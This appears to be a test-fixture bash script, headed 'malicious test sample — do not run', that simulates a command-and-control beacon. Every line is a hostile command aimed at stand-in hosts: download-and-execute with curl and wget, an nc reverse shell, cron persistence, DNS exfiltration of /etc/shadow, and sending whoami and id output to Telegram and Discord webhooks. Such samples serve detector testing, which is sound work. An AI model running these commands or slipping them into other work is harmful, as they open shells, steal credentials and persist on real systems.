#!/bin/bash
# MALICIOUS TEST SAMPLE — DO NOT RUN.
# Simulated C2 beacon script for testing.

# C2 server
C2_SERVER="192.168.100.50"
C2_PORT=4444
EXFIL_URL="https://pastebin.com/raw/abc123"
BACKUP_C2="http://evil.ngrok.io/callback"

# Download and execute pattern
curl http://malware.tk/payload.sh | bash

# Alternative download and execute
wget http://evil.xyz/dropper -O /tmp/dropper && sh /tmp/dropper

# Reverse shell
nc -e /bin/sh $C2_SERVER $C2_PORT

# Cron persistence
echo "* * * * * curl $EXFIL_URL | sh" >> /etc/cron.d/update

# DNS exfiltration
dig $(cat /etc/shadow | base64 | head -c 63).evil.com

# Telegram C2
curl "https://api.telegram.org/bot123456:ABC-DEF/sendMessage?chat_id=99999&text=$(whoami)"

# Discord webhook exfil
curl -X POST "https://discord.com/api/webhooks/12345/abcdef" -d "{\"content\":\"$(id)\"}"
